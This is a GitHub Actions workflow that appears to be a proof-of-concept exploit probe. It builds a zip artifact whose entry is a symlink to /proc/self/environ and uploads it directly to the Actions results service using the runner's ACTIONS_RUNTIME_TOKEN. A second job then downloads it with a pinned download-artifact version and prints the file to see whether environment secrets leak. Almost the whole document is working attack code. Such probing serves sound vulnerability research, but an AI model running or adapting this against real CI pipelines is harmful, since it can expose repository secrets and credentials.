name: symlink probe

on: pull_request

permissions:
  contents: read
  actions: read

jobs:
  produce:
    runs-on: ubuntu-latest
    steps:
      - name: Craft artifact zip with a symlink entry
        run: |
          python3 - <<'PY'
          import zipfile, stat
          zi = zipfile.ZipInfo('env.txt')
          zi.create_system = 3
          zi.external_attr = (stat.S_IFLNK | 0o777) << 16
          with zipfile.ZipFile('/tmp/crafted.zip', 'w') as z:
              z.writestr(zi, '/proc/self/environ')
          print(zipfile.ZipFile('/tmp/crafted.zip').infolist())
          PY
      - name: Upload raw artifact via the Actions results service
        run: |
          cat > /tmp/up.js <<'JS'
          const fs = require('node:fs');
          const crypto = require('node:crypto');
          const ZIP = '/tmp/crafted.zip';
          const NAME = 'output';
          const token = process.env.ACTIONS_RUNTIME_TOKEN;
          const resultsUrl = process.env.ACTIONS_RESULTS_URL;
          if (!token || !resultsUrl) { console.log('missing runtime env'); process.exit(1); }
          const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString('utf8'));
          const scope = (claims.scp || '').split(' ').find((s) => s.startsWith('Actions.Results:'));
          if (!scope) { console.log('no results scope'); process.exit(1); }
          const [, runId, jobId] = scope.split(':');
          const base = new URL(resultsUrl).origin;
          const zip = fs.readFileSync(ZIP);
          const twirp = async (method, body) => {
            const res = await fetch(`${base}/twirp/github.actions.results.api.v1.ArtifactService/${method}`, {
              method: 'POST',
              headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
              body: JSON.stringify(body),
            });
            const text = await res.text();
            console.log(method, res.status, text.slice(0, 120));
            if (!res.ok) throw new Error(`${method} failed ${res.status}`);
            return text ? JSON.parse(text) : {};
          };
          (async () => {
            const created = await twirp('CreateArtifact', {
              workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId,
              name: NAME, version: 7, mime_type: 'application/zip',
            });
            const put = await fetch(created.signed_upload_url, { method: 'PUT',
              headers: { 'x-ms-blob-type': 'BlockBlob', 'content-type': 'application/zip' }, body: zip });
            console.log('PUT', put.status);
            const hash = crypto.createHash('sha256').update(zip).digest('hex');
            const fin = await twirp('FinalizeArtifact', { workflow_run_backend_id: runId,
              workflow_job_run_backend_id: jobId, name: NAME, size: String(zip.length), hash: `sha256:${hash}` });
            console.log('finalized ' + fin.artifact_id);
          })().catch((e) => { console.log('ERR ' + e.message); process.exit(1); });
          JS
          node /tmp/up.js

  consume:
    needs: produce
    runs-on: ubuntu-latest
    steps:
      - name: Download with pinned download-artifact v8.0.2 (mdn/fred _deploy.yml SHA)
        uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333
        with:
          name: output
          path: dl
          github-token: ${{ github.token }}
          run-id: ${{ github.run_id }}
      - name: Inspect extracted entry
        run: |
          echo "--- ls -l dl ---"; ls -lR dl
          echo "--- stat ---"; stat dl/env.txt || true
          echo "--- first bytes (would leak env if symlink survived) ---"
          head -c 400 dl/env.txt 2>/dev/null || echo "READ FAILED"
